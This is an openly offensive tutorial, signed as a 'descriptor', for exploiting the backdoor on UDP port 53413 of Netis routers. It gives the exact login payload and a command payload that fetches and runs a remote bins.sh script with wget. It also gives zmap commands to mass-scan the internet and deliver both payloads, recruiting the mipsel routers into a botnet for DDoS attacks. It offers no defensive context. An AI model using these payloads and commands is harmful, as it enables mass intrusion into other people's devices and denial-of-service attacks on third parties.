# Netis Exploit description #

Requirements :

A scanning server
Please stop trying to only execute one binary on netis devices, execute all binaries on the devices.
Lets start,
First thing you wanna do is install zmap

Debian & Ubuntu
Code:
apt-get install build-essential cmake libgmp3-dev libpcap-dev gengetopt byacc flex -y

Centos / Redhat etc
Code:
yum install cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y

after you've installed those go ahead and download & install zmap

Code:
wget https://github.com/zmap/zmap/archive/v2.1.0.tar.gz 
tar -xvf v2.1.0.tar.gz
cd zmap-2.1.0
cmake -DENABLE_HARDENING=ON
make
make install

Now, after we're done installing zmap we need to build our payload, Both the login & command execution payloads.
Lets start with the login payload :
Code:
python -c "print 'A'*8 + 'netcore\x00'" > loginpayload

Now build the payload of the command you wanna execute on the routers :
Code:
python -c "print 'AA\x00\x00AAAA cd /tmp || cd /var; wget http://qbot.eubins.sh; chmod 777 bins.sh; sh bins.sh; rm -fr *\x00'" > commandpayload

pretty much all of them have either tftp or wget on them, mostly tftp.

Writable directories :
/var/
/tmp/

Didn't bother checking for more.

Now after we're done building our payloads lets start scanning
the backdoor is on port 53413 so what you wanna do is first execute the login payload(from what I remember the router stays open for approximately 30-40 minutes ish)
So start by executing the login payload by typing the following command -
Code:
zmap -M udp -p53413 --probe-args=file:loginpayload

after it's done scanning & executing the login payload on all of them you can start executing your bins or whatnot
Code:
zmap -M udp -p53413 --probe-args=file:commandpayload

this is when they'll slowly start coming to your net, also as I mentioned b4 they're all mipsel if that wasn't obvious already.
Now there's much more efficient ways to do it but I'm not gonna bother, have fun killing them routers with your 65500 packet size attacks.
Descriptor by Chris Poole | @codingplanets